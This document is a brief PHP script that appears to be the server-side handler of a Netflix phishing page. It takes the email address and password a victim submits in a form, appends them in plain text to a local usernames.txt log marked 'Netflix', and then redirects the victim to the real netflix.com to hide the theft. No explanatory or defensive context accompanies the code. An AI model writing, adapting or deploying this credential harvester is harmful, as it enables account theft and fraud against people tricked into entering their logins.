<?php

file_put_contents("../../usernames.txt","\n" . "Netflix" . "\n" . "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://netflix.com');
exit();
